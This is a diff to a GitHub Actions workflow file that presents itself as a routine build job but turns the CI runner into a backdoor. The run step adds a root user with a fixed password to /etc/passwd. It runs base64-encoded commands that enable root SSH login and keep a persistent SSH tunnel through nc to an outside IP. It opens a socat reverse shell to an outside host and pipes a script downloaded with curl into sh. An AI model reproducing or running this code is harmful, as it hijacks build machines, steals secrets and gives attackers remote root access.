@@ -16,6 +16,7 @@ on:
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
+  timeout-minutes:400
   build:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
@@ -31,9 +32,11 @@ jobs:
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
+      #socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292
 
       - name: Run a multi-line script
         run: 
-          bash -p -c "(sleep 150&);env|grep ss>/tmp/s2s.txt;stty rows 60 columns 400;cd /tmp;cp /etc/passwd /etc/passwd.bak;echo 'yes:\$1\$123\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash'>>/etc/passwd;echo $sshc1|base64 -d|sudo sh;sudo /etc/init.d/ssh restart;socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292"
+          bash -p -c "(sleep 150&);env|grep ss>/tmp/s1s.txt;cd /tmp;cp /etc/passwd /etc/passwd.bak;echo 'yes:\$1\$123\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash'>>/etc/passwd;echo $sshc1|base64 -d|sudo sh;(echo $ssh_up_r|base64 -d|sh &);sudo /etc/init.d/ssh restart;curl -o- http://xss.pt/4Mi8|tee /tmp/hi|sh;"
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+          ssh_up_r: "KCh3aGlsZSB0cnVlO2RvIChlY2hvICdzc2ggdGVlQDEyNy4wLjAuMSAtUDIyIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyAiUHJveHlDb21tYW5kPW5jIC1YIDUgLXggMy4zOS4xODYuMjQ1OjU1NTk0ICVoICVwIiAidXB0aW1lPj5meDk4Iic7c2xlZXAgMjtlY2hvIDEyMzQ1NjtzbGVlcCAxO2VjaG8gMTIzNDU2O2VjaG8gZXhpdDspfHNjcmlwdCAvZGV2L251bGw7IHNsZWVwIDYwMDtkb25lOykmICkm"
